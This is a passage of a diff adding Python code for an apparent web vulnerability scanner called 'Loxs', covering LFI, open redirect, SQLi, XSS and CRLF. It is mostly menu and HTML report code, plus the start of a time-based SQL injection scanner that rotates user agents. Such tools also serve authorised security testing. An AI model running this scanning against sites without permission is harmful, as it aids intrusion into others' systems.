+    from urllib.parse import urlunsplit
+    import asyncio
+    from selenium.webdriver.chrome.service import Service
+    import re
+    from rich.progress import Progress
+    import urllib.parse
+    import requests
+    import urllib3
+    from requests.adapters import HTTPAdapter
+    from urllib3.util.retry import Retry
+    from prompt_toolkit import prompt
+    from prompt_toolkit.completion import PathCompleter
+    from urllib.parse import urlparse
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    from curses import panel
+    import random
+    import re
+    from wsgiref import headers
+    from colorama import Fore, Style, init
+    from time import sleep
+    from rich import print as rich_print
+    from rich.panel import Panel
+    from rich.table import Table
+    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
+    from bs4 import BeautifulSoup
+    import urllib3
+    from prompt_toolkit import prompt
+    from prompt_toolkit.completion import PathCompleter
+    import logging
+    from requests.adapters import HTTPAdapter
+    from urllib3.util.retry import Retry
+    import argparse
+    import concurrent.futures
+    import time
+    import aiohttp
+    from selenium import webdriver
+    from selenium.webdriver.chrome.service import Service as ChromeService
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.chrome.options import Options
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+    from webdriver_manager.chrome import ChromeDriverManager
+    from urllib.parse import urlsplit, parse_qs, urlencode, urlunsplit
+    from rich.console import Console
+    from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException
+    from functools import partial
+    from packaging import version
+    from rich.text import Text
+    from queue import Queue
+    from threading import Lock
+
+    USER_AGENTS = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
+        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
+        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.65 Mobile Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; GT-I9505 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
+        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/114.0",
+        "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
+        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
+        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.137 Mobile Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
+        "Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
+        "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
+        "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; GT-P5113 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",
+        "Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931",
+        "Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Firefox/11.0",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko Firefox/11.0",
+        "Mozilla/5.0 (Windows NT 6.1; U;WOW64; de;rv:11.0) Gecko Firefox/11.0",
+        "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0",
+        "Mozilla/6.0 (Macintosh; I; Intel Mac OS X 11_7_9; de-LI; rv:1.9b4) Gecko/2012010317 Firefox/10.0a4",
+        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 11_7_9; de-LI; rv:1.9b4) Gecko/2012010317 Firefox/10.0a4",
+        "Mozilla/5.0 (X11; Mageia; Linux x86_64; rv:10.0.9) Gecko/20100101 Firefox/10.0.9",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0a2) Gecko/20111101 Firefox/9.0a2",
+        "Mozilla/5.0 (Windows NT 6.2; rv:9.0.1) Gecko/20100101 Firefox/9.0.1",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",
+        "Mozilla/5.0 (Windows NT 5.1; rv:8.0; en_us) Gecko/20100101 Firefox/8.0",
+        "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20100101 Firefox/7.0",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110613 Firefox/6.0a2",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110612 Firefox/6.0a2",
+        "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36",
+        "Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
+        "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17",
+        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15",
+        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.14 (KHTML, like Gecko) Chrome/24.0.1292.0 Safari/537.14",
+        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13",
+        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13"
+    ]
+
+    
+    init(autoreset=True)
+    
+    def check_and_install_packages(packages):
+        for package, version in packages.items():
+            try:
+                __import__(package)
+            except ImportError:
+                subprocess.check_call([sys.executable, '-m', 'pip', 'install', f"{package}=={version}"])
+
+    def clear_screen():
+        os.system('cls' if os.name == 'nt' else 'clear')
+
+    def display_menu():
+        title = r"""
+             .__                                      
+___  ____ __|  |   ____   ______ ____ _____    ____  
+\  \/ /  |  \  |  /    \ /  ___// ___\\__  \  /    \ 
+ \   /|  |  /  |_|   |  \\___ \\  \___ / __ \|   |  \
+  \_/ |____/|____/___|  /____  >\___  >____  /___|  /
+                      \/     \/     \/     \/     \/          
+    """
+        print(Color.ORANGE + Style.BRIGHT + title.center(72))
+        print(Fore.WHITE + Style.BRIGHT + "─" * 72)
+        border_color = Color.CYAN + Style.BRIGHT
+        option_color = Fore.WHITE + Style.BRIGHT  
+        
+        print(border_color + "┌" + "─" * 72 + "┐")
+        
+        options = [
+            "1] LFi Scanner",
+            "2] OR Scanner",
+            "3] SQLi Scanner",
+            "4] XSS Scanner",
+            "5] CRLF Scanner",
+            "6] tool Update",
+            "7] Exit"
+        ]
+        
+        for option in options:
+            print(border_color + "│" + option_color + option.ljust(72) + border_color + "│")
+        
+        print(border_color + "└" + "─" * 72 + "┘")
+        authors = "Created by: Coffinxp, 1hehaq, HexSh1dow, Naho, AnonKryptiQuz, Hghost010"
+        instructions = "Select an option by entering the corresponding number:"
+        
+        print(Fore.WHITE + Style.BRIGHT + "─" * 72)
+        print(Fore.WHITE + Style.BRIGHT + authors.center(72))
+        print(Fore.WHITE + Style.BRIGHT + "─" * 72)
+        print(Fore.WHITE + Style.BRIGHT + instructions.center(72))
+        print(Fore.WHITE + Style.BRIGHT + "─" * 72)
+
+    def print_exit_menu():
+        clear_screen()
+
+        panel = Panel(r"""
+         ______               ______              
+        |   __ \.--.--.-----.|   __ \.--.--.-----.
+        |   __ <|  |  |  -__||   __ <|  |  |  -__|
+        |______/|___  |_____||______/|___  |_____|
+                |_____|              |_____|      
+        
+  Credit: Coffinxp - 1hehaq - HexSh1dow - AnonKryptiQuz - Naho - Hghost010
+            """,
+            style="bold green",
+            border_style="blue",
+            expand=False
+        )
+
+        rich_print(panel)
+        print(Color.RED + "\n\nSession Off..\n")
+        sys.exit()
+
+        
+    def generate_html_report(scan_type, total_found, total_scanned, time_taken, vulnerable_urls):
+        html_content = f"""
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Loxs Security Scan Report</title>
+            <style>
+                @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+                
+                :root {{
+                    --primary-color: #ff7f50;
+                    --secondary-color: #6e44ff;
+                    --accent-color: #5dc05d;
+                    --background-color: #000;
+                    --container-bg: rgba(0, 20, 40, 0.8);
+                }}
+                
+                body {{
+                    font-family: 'Share Tech Mono', monospace;
+                    line-height: 1.6;
+                    color: var(--primary-color);
+                    background-color: var(--background-color);
+                    margin: 0;
+                    padding: 0;
+                    overflow-x: hidden;
+                    background-image: 
+                        linear-gradient(rgba(0, 255, 255, 0.1) 1px, transparent 1px),
+                        linear-gradient(90deg, rgba(0, 255, 255, 0.1) 1px, transparent 1px);
+                    background-size: 20px 20px;
+                    animation: backgroundScroll 20s linear infinite;
+                    cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewport="0 0 24 24" style="fill:rgba(255,127,80,1);"><path d="M12 0c1.104.001 2 .896 2 2v6h8c1.104 0 2 .896 2 2s-.896 2-2 2h-8v8c0 1.104-.896 2-2 2s-2-.896-2-2v-8h-8c-1.104 0-2-.896-2-2s.896-2 2-2h8v-6c0-1.104.896-2 2-2z"/></svg>'), auto;
+                }}
+                @keyframes backgroundScroll {{
+                    0% {{ background-position: 0 0; }}
+                    100% {{ background-position: 0 20px; }}
+                }}
+                .container {{
+                    max-width: 900px;
+                    margin: 2rem auto;
+                    padding: 2rem;
+                    background-color: var(--container-bg);
+                    box-shadow: 0 0 20px var(--primary-color);
+                    border-radius: 10px;
+                    position: relative;
+                    overflow: hidden;
+                    border: 1px solid var(--primary-color);
+                }}
+                .container::before {{
+                    content: "";
+                    position: absolute;
+                    top: -50%;
+                    left: -50%;
+                    width: 200%;
+                    height: 200%;
+                    background: repeating-linear-gradient(
+                        0deg,
+                        transparent,
+                        transparent 2px,
+                        rgba(0, 255, 255, 0.1) 2px,
+                        rgba(0, 255, 255, 0.1) 4px
+                    );
+                    animation: scan 10s linear infinite;
+                    pointer-events: none;
+                    z-index: -1;
+                }}
+                @keyframes scan {{
+                    0% {{ transform: translateY(0); }}
+                    100% {{ transform: translateY(50%); }}
+                }}
+                .animated-text {{
+                    position: relative;
+                    display: inline-block;
+                    font-size: 2.5rem;
+                    font-weight: bold;
+                    text-transform: uppercase;
+                    letter-spacing: 4px;
+                    color: var(--secondary-color);
+                    text-shadow: 0 0 10px var(--secondary-color);
+                    margin-bottom: 1rem;
+                    width: 100%;
+                    text-align: center;
+                }}
+                .animated-text::before,
+                .animated-text::after {{
+                    content: attr(data-text);
+                    position: absolute;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    z-index: -1;
+                }}
+                .animated-text::before {{
+                    color: var(--accent-color);
+                    animation: glitch 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94) both infinite;
+                }}
+                .animated-text::after {{
+                    color: var(--primary-color);
+                    animation: glitch 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94) reverse both infinite;
+                }}
+                * {{
+                    cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewport="0 0 24 24" style="fill:rgba(110,68,255,1);transform:rotate(-45deg);"><path d="M12 2L2 22l10-6 10 6L12 2z"/></svg>'), auto;
+                }}
+                a, .stat-card, .vulnerable-item, button, input[type="submit"] {{
+                    cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewport="0 0 24 24" style="fill:rgba(110,68,255,1);transform:rotate(-45deg);"><path d="M12 2L2 22l10-6 10 6L12 2z"/></svg>'), pointer;
+                }}
+                a:hover, .stat-card:hover, button:hover, input[type="submit"]:hover {{
+                    cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewport="0 0 24 24" style="fill:rgba(255,127,80,1);transform:rotate(-45deg);"><path d="M12 2L2 22l10-6 10 6L12 2z"/></svg>'), pointer;
+                    filter: drop-shadow(0 0 6px var(--secondary-color));
+                }}
+                .vulnerable-item:hover {{
+                    cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewport="0 0 24 24" style="fill:rgba(255,0,0,1);transform:rotate(-45deg);"><path d="M12 2L2 22l10-6 10 6L12 2z"/></svg>'), pointer;
+                    filter: drop-shadow(0 0 6px #f00);
+                }}
+                @keyframes glitch {{
+                    0% {{ transform: translate(0); }}
+                    20% {{ transform: translate(-2px, 2px); }}
+                    40% {{ transform: translate(-2px, -2px); }}
+                    60% {{ transform: translate(2px, 2px); }}
+                    80% {{ transform: translate(2px, -2px); }}
+                    100% {{ transform: translate(0); }}
+                }}
+                .logo {{
+                    text-align: center;
+                    margin-bottom: 2rem;
+                }}
+                .logo svg {{
+                    max-width: 300px;
+                    height: auto;
+                }}
+                .summary {{
+                    background-color: rgba(0, 40, 80, 0.6);
+                    padding: 1.5rem;
+                    border-radius: 8px;
+                    margin-bottom: 2rem;
+                    border: 1px solid var(--primary-color);
+                    box-shadow: 0 0 10px var(--primary-color);
+                }}
+                .summary-item {{
+                    display: flex;
+                    justify-content: space-between;
+                    margin-bottom: 0.5rem;
+                    border-bottom: 1px solid rgba(0, 255, 255, 0.3);
+                    padding-bottom: 0.5rem;
+                }}
+                .summary-label {{
+                    font-weight: bold;
+                    color: var(--accent-color);
+                }}
+                .summary-value {{
+                    color: var(--primary-color);
+                }}
+                .progress-bar {{
+                    width: 100%;
+                    height: 20px;
+                    background-color: rgba(0, 255, 255, 0.1);
+                    border-radius: 10px;
+                    overflow: hidden;
+                    margin-bottom: 1rem;
+                }}
+                .progress {{
+                    width: {(total_found / total_scanned) * 100}%;
+                    height: 100%;
+                    background-color: var(--secondary-color);
+                    animation: pulse 2s infinite;
+                }}
+                @keyframes pulse {{
+                    0% {{ opacity: 0.6; }}
+                    50% {{ opacity: 1; }}
+                    100% {{ opacity: 0.6; }}
+                }}
+                .stats-grid {{
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+                    gap: 1rem;
+                    margin-bottom: 2rem;
+                }}
+                .stat-card {{
+                    background-color: rgba(0, 40, 80, 0.6);
+                    padding: 1rem;
+                    border-radius: 8px;
+                    text-align: center;
+                    border: 1px solid var(--primary-color);
+                    transition: all 0.3s ease;
+                }}
+                .stat-card:hover {{
+                    transform: translateY(-5px);
+                    box-shadow: 0 5px 15px rgba(0, 255, 255, 0.3);
+                }}
+                .stat-value {{
+                    font-size: 2rem;
+                    font-weight: bold;
+                    color: var(--accent-color);
+                }}
+                .stat-label {{
+                    font-size: 0.9rem;
+                    color: var(--primary-color);
+                }}
+                .timeline {{
+                    position: relative;
+                    max-width: 1200px;
+                    margin: 2rem auto;
+                }}
+                .timeline::after {{
+                    content: '';
+                    position: absolute;
+                    width: 6px;
+                    background-color: var(--primary-color);
+                    top: 0;
+                    bottom: 0;
+                    left: 50%;
+                    margin-left: -3px;
+                }}
+                .timeline-item {{
+                    padding: 10px 40px;
+                    position: relative;
+                    background-color: inherit;
+                    width: 50%;
+                }}
+                .timeline-item::after {{
+                    content: '';
+                    position: absolute;
+                    width: 25px;
+                    height: 25px;
+                    right: -17px;
+                    background-color: var(--background-color);
+                    border: 4px solid var(--accent-color);
+                    top: 15px;
+                    border-radius: 50%;
+                    z-index: 1;
+                }}
+                .left {{
+                    left: 0;
+                }}
+                .right {{
+                    left: 50%;
+                }}
+                .right::after {{
+                    left: -16px;
+                }}
+                .timeline-content {{
+                    padding: 20px 30px;
+                    background-color: rgba(0, 40, 80, 0.6);
+                    position: relative;
+                    border-radius: 6px;
+                }}
+                .vulnerable-item {{
+                    background-color: rgba(255, 0, 0, 0.2);
+                    border: 1px solid #f00;
+                    color: #f00;
+                    padding: 1rem;
+                    margin-bottom: 1rem;
+                    border-radius: 4px;
+                    word-break: break-all;
+                    box-shadow: 0 0 10px #f00;
+                    transition: all 0.3s ease;
+                    position: relative;
+                    overflow: hidden;
+                }}
+                .vulnerable-item::before {{
+                    content: "VULNERABLE";
+                    position: absolute;
+                    top: 0;
+                    right: 0;
+                    background-color: #f00;
+                    color: #000;
+                    font-size: 0.7rem;
+                    padding: 0.2rem 0.5rem;
+                    transform: rotate(45deg) translate(25%, -50%);
+                }}
+                .vulnerable-item:hover {{
+                    transform: scale(1.02);
+                    box-shadow: 0 0 20px #f00;
+                }}
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <div class="logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 200">
+                    <defs>
+                        <linearGradient id="scanGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                        <stop offset="0%" style="stop-color:#6E44FF"/>
+                        <stop offset="50%" style="stop-color:#1CDCE8"/>
+                        <stop offset="100%" style="stop-color:#F77E21"/>
+                        </linearGradient>
+                        <linearGradient id="textGradient" x1="0%" y1="0%" x2="100%" y2="0%">
+                        <stop offset="0%" style="stop-color:#FF5F6D"/>
+                        <stop offset="50%" style="stop-color:#FFC371"/>
+                        <stop offset="100%" style="stop-color:#FF5F6D"/>
+                        </linearGradient>
+                    </defs>
+
+                    <!-- Central Scanner Element -->
+                    <g transform="translate(150,100)">
+                        <!-- Outer Ring -->
+                        <circle r="100" fill="none" stroke="#1CDCE8" stroke-width="4" stroke-dasharray="10 5">
+                        <animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="20s" repeatCount="indefinite"/>
+                        </circle>
+                        
+                        <!-- Middle Ring -->
+                        <circle r="85" fill="none" stroke="#F77E21" stroke-width="3" stroke-dasharray="8 4">
+                        <animateTransform attributeName="transform" type="rotate" from="360" to="0" dur="15s" repeatCount="indefinite"/>
+                        </circle>
+                        
+                        <!-- Inner Ring -->
+                        <circle r="50" fill="none" stroke="#6E44FF" stroke-width="2" stroke-dasharray="6 3">
+                        <animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="10s" repeatCount="indefinite"/>
+                        </circle>
+                    </g>
+
+                    <!-- Scanning Beam -->
+                    <g transform="translate(150,100)">
+                        <path d="M0,0 L-70,0 A70,70 0 0,1 -49.5,-49.5" fill="none" stroke="url(#scanGradient)" stroke-width="4">
+                        <animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="4s" repeatCount="indefinite"/>
+                        </path>
+                    </g>
+
+                    <!-- Vulnerability Nodes -->
+                    <g id="vulnerabilityNodes">
+                        <circle cx="150" cy="30" r="5" fill="#FF5F6D">
+                        <animate attributeName="r" values="5;7;5" dur="2s" repeatCount="indefinite"/>
+                        </circle>
+                        <circle cx="230" cy="100" r="5" fill="#FFC371">
+                        <animate attributeName="r" values="5;7;5" dur="2.5s" repeatCount="indefinite"/>
+                        </circle>
+                        <circle cx="190" cy="170" r="5" fill="#F77E21">
+                        <animate attributeName="r" values="5;7;5" dur="3s" repeatCount="indefinite"/>
+                        </circle>
+                        <circle cx="110" cy="170" r="5" fill="#1CDCE8">
+                        <animate attributeName="r" values="5;7;5" dur="2.7s" repeatCount="indefinite"/>
+                        </circle>
+                        <circle cx="70" cy="100" r="5" fill="#6E44FF">
+                        <animate attributeName="r" values="5;7;5" dur="2.2s" repeatCount="indefinite"/>
+                        </circle>
+                    </g>
+
+                    <!-- Connecting Lines -->
+                    <g stroke="#1CDCE8" stroke-width="1" opacity="0.6">
+                        <line x1="150" y1="30" x2="230" y2="100">
+                        <animate attributeName="opacity" values="0.6;0.2;0.6" dur="3s" repeatCount="indefinite"/>
+                        </line>
+                        <line x1="230" y1="100" x2="190" y2="170">
+                        <animate attributeName="opacity" values="0.6;0.2;0.6" dur="3.5s" repeatCount="indefinite"/>
+                        </line>
+                        <line x1="190" y1="170" x2="110" y2="170">
+                        <animate attributeName="opacity" values="0.6;0.2;0.6" dur="4s" repeatCount="indefinite"/>
+                        </line>
+                        <line x1="110" y1="170" x2="70" y2="100">
+                        <animate attributeName="opacity" values="0.6;0.2;0.6" dur="3.7s" repeatCount="indefinite"/>
+                        </line>
+                        <line x1="70" y1="100" x2="150" y2="30">
+                        <animate attributeName="opacity" values="0.6;0.2;0.6" dur="3.2s" repeatCount="indefinite"/>
+                        </line>
+                    </g>
+
+                    <!-- LOXS Text -->
+                    <g transform="translate(150,100)">
+                        <text x="0" y="5" font-family="Arial, sans-serif" font-size="40" font-weight="bold" fill="url(#textGradient)" text-anchor="middle">LOXS</text>
+                    </g>
+                    </svg>
+                </div>
+                <h1 class="animated-text" data-text="Loxs Security Scan Report">Loxs Security Scan Report</h1>
+                <div class="summary">
+                    <div class="summary-item">
+                        <span class="summary-label">Scan Type:</span>
+                        <span class="summary-value">{scan_type}</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Total Vulnerabilities Found:</span>
+                        <span class="summary-value">{total_found}</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Total URLs Scanned:</span>
+                        <span class="summary-value">{total_scanned}</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Time Taken:</span>
+                        <span class="summary-value">{time_taken} seconds</span>
+                    </div>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress"></div>
+                </div>
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-value">{total_found}</div>
+                        <div class="stat-label">Vulnerabilities Detected</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value">{total_scanned}</div>
+                        <div class="stat-label">URLs Scanned</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value">{time_taken}s</div>
+                        <div class="stat-label">Scan Duration</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value">{total_found / total_scanned:.2%}</div>
+                        <div class="stat-label">Vulnerability Rate</div>
+                    </div>
+                </div>
+                <h2 class="animated-text" data-text="Scan Timeline">Scan Timeline</h2>
+                <div class="timeline">
+                    <div class="timeline-item left">
+                        <div class="timeline-content">
+                            <h3>Scan Initiated</h3>
+                            <p>Type: {scan_type}</p>
+                        </div>
+                    </div>
+                    <div class="timeline-item right">
+                        <div class="timeline-content">
+                            <h3>Scanning Process</h3>
+                            <p>{total_scanned} URLs analyzed</p>
+                        </div>
+                    </div>
+                    <div class="timeline-item left">
+                        <div class="timeline-content">
+                            <h3>Vulnerabilities Detected</h3>
+                            <p>{total_found} vulnerabilities found</p>
+                        </div>
+                    </div>
+                    <div class="timeline-item right">
+                        <div class="timeline-content">
+                            <h3>Scan Completed</h3>
+                            <p>Duration: {time_taken} seconds</p>
+                        </div>
+                    </div>
+                </div>
+                <h2 class="animated-text" data-text="Vulnerable URLs">Vulnerable URLs</h2>
+                <ul class="vulnerable-list">
+                    {"".join(f'<li class="vulnerable-item"><a href="{url}" target="_blank" style="color: inherit; text-decoration: none;">{url}</a></li>' for url in vulnerable_urls)}
+                </ul>
+            </div>
+        </body>
+        </html>
+        """
+        return html_content
+
+    def save_html_report(html_content, filename):
+        if not filename.lower().endswith('.html'):
+            filename += '.html'
+        
+        absolute_path = os.path.abspath(filename)
+        print(f"{Fore.YELLOW}\nDEBUG: {Fore.WHITE}Saving HTML report to {absolute_path}")
+        print(f"{Fore.YELLOW}DEBUG: {Fore.WHITE}Current working directory: {os.getcwd()}\n")
+        
+        try:
+            with open(absolute_path, 'w', encoding='utf-8') as f:
+                f.write(html_content)
+            print(f"{Fore.GREEN}[✓] HTML report saved as {absolute_path}")
+            return absolute_path
+        except Exception as e:
+            print(f"{Fore.RED}[✗] Failed to save HTML report: {e}")
+            return None
+    
+            
+            
+    def run_sql_scanner(scan_state=None):
+            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+            init(autoreset=True)
+            
+            def get_random_user_agent():
+                return random.choice(USER_AGENTS)
+                
+            def get_retry_session(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 504)):
+                    session = requests.Session()
+                    retry = Retry(
+                    total=retries,
+                    read=retries,
+                    connect=retries,
+                    backoff_factor=backoff_factor,
+                    status_forcelist=status_forcelist,
+                    )
+                    adapter = HTTPAdapter(max_retries=retry)
+                    session.mount('http://', adapter)
+                    session.mount('https://', adapter)
+                    return session
+
+            def perform_request(url, payload, cookie):
+                url_with_payload = f"{url}{payload}"
+                start_time = time.time()
+                    
+                headers = {
+                    'User-Agent': get_random_user_agent()
+                }
+
+                try:
+                    response = requests.get(url_with_payload, headers=headers, cookies={'cookie': cookie} if cookie else None)
+                    response.raise_for_status()
+                    success = True
+                    error_message = None
+                except requests.exceptions.RequestException as e:
+                    success = False
+                    error_message = str(e)
+
+                response_time = time.time() - start_time
+                
+                vulnerability_detected = response_time >= 10
+                if vulnerability_detected and scan_state:
+                    scan_state['vulnerability_found'] = True
+                    scan_state['vulnerable_urls'].append(url_with_payload)
+                    scan_state['total_found'] += 1
+                if scan_state:
+                    scan_state['total_scanned'] += 1
+                
+                return success, url_with_payload, response_time, error_message, vulnerability_detected
+
+            def get_file_path(prompt_text):
+                completer = PathCompleter()
+                return prompt(prompt_text, completer=completer).strip()
+
+            def handle_exception(exc_type, exc_value, exc_traceback, vulnerable_urls, total_found, total_scanned, start_time):
+                if issubclass(exc_type, KeyboardInterrupt):
+                    print(f"\n{Fore.YELLOW}Program terminated by the user!")
+                    save_results(vulnerable_urls, total_found, total_scanned, start_time)
+                    sys.exit(0)
+                else:
+                    print(f"\n{Fore.RED}An unexpected error occurred: {exc_value}")
+                    sys.exit(0)
+
+            def save_results(vulnerable_urls, total_found, total_scanned, start_time):
+                generate_report = input(f"{Fore.CYAN}\n[?] Do you want to generate an HTML report? (y/n): ").strip().lower()
+                if generate_report == 'y':
+                    html_content = generate_html_report("Structured Query Language Injection (SQLi)", total_found, total_scanned, int(time.time() - start_time), vulnerable_urls)
+                    filename = input(f"{Fore.CYAN}[?] Enter the filename for the HTML report: ").strip()
+                    report_file = save_html_report(html_content, filename)
+                    
+            def prompt_for_urls():
+                while True:
+                    try:
+                        url_input = get_file_path("[?] Enter the path to the input file containing the URLs (or press Enter to input a single URL): ")
+                        if url_input:
+                            if not os.path.isfile(url_input):
+                                raise FileNotFoundError(f"File not found: {url_input}")
+                            with open(url_input) as file:
+                                urls = [line.strip() for line in file if line.strip()]
+                            return urls
+                        else:
+                            single_url = input(f"{Fore.CYAN}[?] Enter a single URL to scan: ").strip()
+                            if single_url:
